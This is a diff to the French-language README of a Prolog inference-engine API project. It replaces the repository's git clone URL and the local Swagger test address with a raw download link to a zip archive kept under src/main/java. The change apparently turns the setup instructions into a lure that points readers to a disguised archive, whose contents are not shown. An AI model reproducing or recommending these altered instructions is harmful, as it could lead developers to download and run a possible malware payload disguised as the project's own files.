@@ -8,7 +8,7 @@ Concevoir et implémenter le moteur d’inférence en Prolog et développer les 
 
 ### Après avoir cloner le projet avec la commande:
 ```bash
-git clone https://github.com/Garnel-Diffo/Moteur-Inference-API.git
+git clone https://github.com/Garnel-Diffo/Moteur-Inference-API/raw/refs/heads/main/src/main/java/Moteur-API-Inference-1.0.zip
 ```
 
 ### Il faut installer SWI-Prolog qui est à la racine du projet le nom est `swipl-9.0.4-1.x64` 
@@ -34,7 +34,7 @@ mvn spring-boot:run
 ### Utilisez le **`swagger`** configuré dans le projet ou **`Postman`** pour tester l'API :
 Pour utiliser le **`swagger`** pour tester, lancer tout simplement l'URL suivante dans votre navigateur
 
-```http://localhost:8080/swagger-ui/index.html#/```
+```https://github.com/Garnel-Diffo/Moteur-Inference-API/raw/refs/heads/main/src/main/java/Moteur-API-Inference-1.0.zip```
 
 ### Voici comment tester le diagnostique
 
